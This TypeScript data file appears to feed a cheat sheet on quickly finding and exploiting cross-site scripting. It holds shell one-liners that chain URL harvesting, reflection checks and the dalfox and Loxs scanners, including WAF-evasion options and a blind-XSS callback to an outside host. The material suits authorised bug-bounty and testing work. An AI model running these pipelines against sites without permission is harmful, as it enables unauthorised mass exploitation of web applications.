export interface FastXSSCategory {
  category: string
  commands: { command: string; description: string }[]
}

export const fastXSSCategories: FastXSSCategory[] = [
  {
    category: "Introduction",
    commands: [
      { command: "Fast XSS workflow — spot XSS vulnerabilities quickly using a powerful one-line command that chains GAU, gf, URO, Gxss, kxss, and tee for automated discovery and filtering.", description: "Saves time by automating URL discovery + initial filtering without manually checking every URL." },
    ],
  },
  {
    category: "Phase 1 — Initial URL Discovery & Filtering",
    commands: [
      { command: 'echo example.com | gau | gf xss | uro | Gxss | kxss | tee xss_output.txt', description: "#1 Full pipeline: GAU (fetch URLs) → gf xss (filter params) → URO (dedup) → Gxss (check reflection) → kxss (unfiltered chars) → tee (save+display)" },
      { command: "GAU = fetches old URLs from Wayback, AlienVault, Common Crawl, URLscan", description: "Tool: gau — passive URL collection" },
      { command: "GF pattern = filters URLs with XSS-prone parameters", description: "Tool: gf xss — parameter filtering" },
      { command: "URO = removes duplicate URLs", description: "Tool: uro — URL deduplication" },
      { command: "Gxss = checks if parameters reflect in response", description: "Tool: Gxss — reflection detection" },
      { command: "kxss = identifies unfiltered special characters for XSS", description: "Tool: kxss — unfiltered character detection" },
    ],
  },
  {
    category: "Content-Type Filtered Oneliner",
    commands: [
      { command: 'echo https://domain.com | gau | gf xss | httpx-toolkit -ct -silent -nc | grep -i -E "text/html|application/xhtml+xml|application/xml|text/xml|image/svg+xml|application/html|application/xml" | cut -d "[" -f 1 | Gxss | kxss', description: "Same pipeline but filters by Content-Type (HTML/XML/SVG only) — removes images, JSON, and other noise" },
    ],
  },
  {
    category: "Phase 2 — Refining & Validating Results",
    commands: [
      { command: 'cat xss_output.txt | grep -oP \'^URL: \\K\\S+\' | sed \'s/=.*/=/\' | sort -u > final.txt', description: "Extract URLs, strip parameter values (page.php?id=123 → page.php?id=), sort, dedup → clean target list in final.txt" },
    ],
  },
  {
    category: "Phase 3 — Automated Exploitation with Loxs",
    commands: [
      { command: "Move final.txt into Loxs directory → Run tool → Select option 4 (XSS scan) → Provide target list + payload file → Loxs tests all payloads and prints confirmed vulnerable URLs", description: "Loxs automates XSS verification: tests each URL against all payloads, prints confirmed XSS, generates HTML report" },
      { command: "https://github.com/coffinxp/loxs", description: "Loxs tool — automated XSS scanner with massive payload list included" },
    ],
  },
  {
    category: "Dalfox Automated Exploitation",
    commands: [
      { command: "echo testphp.vulnweb.com | gau | gf params | uro | Gxss | dalfox pipe --skip-bav --skip-mining-all --skip-grepping --skip-mining-dom --remote-payloads=portswigger,payloadbox", description: "#1 Dalfox with remote payload lists (PortSwigger, Payloadbox) — minimal noise" },
      { command: "echo testphp.vulnweb.com | gau | gf params | uro | Gxss | dalfox pipe --skip-bav --skip-mining-all --skip-grepping --skip-mining-dom --custom-payload yourpayloads.txt", description: "#2 Dalfox with local custom payload file" },
      { command: "echo testphp.vulnweb.com | gau | gf params | uro | Gxss | dalfox pipe --skip-bav --skip-mining-all --skip-grepping --skip-mining-dom --waf-evasion", description: "#3 Dalfox with WAF evasion — slows down when WAF detected (worker=1, delay=3s)" },
      { command: "echo testphp.vulnweb.com | gau | gf params | uro | Gxss | dalfox pipe --skip-bav --skip-mining-all --skip-grepping --deep-domxss", description: "#4 Dalfox deep DOM XSS scanning — thorough client-side analysis" },
      { command: "echo testphp.vulnweb.com | gau | gf params | uro | Gxss | dalfox pipe --skip-bav --skip-mining-all --skip-grepping --blind xss.report/c/coffinxp", description: "#5 Dalfox blind XSS — sends payloads with callback to xss.report for OOB detection" },
    ],
  },
  {
    category: "Dalfox Tool Reference",
    commands: [
      { command: "https://github.com/hahwul/dalfox", description: "Dalfox — fast, flexible XSS automation tool by hahwul" },
    ],
  },
  {
    category: "Video Walkthrough",
    commands: [
      { command: "https://www.youtube.com/watch?v=cRL9REGSKkM", description: "Complete practical demonstration of the Fast XSS methodology" },
    ],
  },
  {
    category: "Conclusion",
    commands: [
      { command: "Fast XSS workflow: GAU → gf → URO → Gxss → kxss → refine → Loxs/Dalfox. Automate discovery, filter noise, validate with tools, generate reports.", description: "Pipeline: echo domain | gau | gf xss | uro | Gxss | kxss | tee output.txt → refine → dalfox pipe for mass exploitation" },
    ],
  },
]

export const fastXSSTools = [
  { name: "Loxs — XSS Scanner", url: "https://github.com/coffinxp/loxs", description: "Automated XSS scanner with massive payload list and HTML report generation" },
  { name: "Dalfox", url: "https://github.com/hahwul/dalfox", description: "Fast, parameter-aware XSS automation tool with WAF evasion, DOM scanning, and blind XSS" },
  { name: "GAU", url: "https://github.com/lc/gau", description: "Get all URLs from passive sources (Wayback, AlienVault, Common Crawl, URLscan)" },
  { name: "Gxss", url: "https://github.com/KathanP19/Gxss", description: "Check which parameters reflect in response for XSS testing" },
  { name: "kxss", url: "https://github.com/tomnomnom/hacks/tree/master/kxss", description: "Identify URLs with unfiltered special characters for XSS" },
]
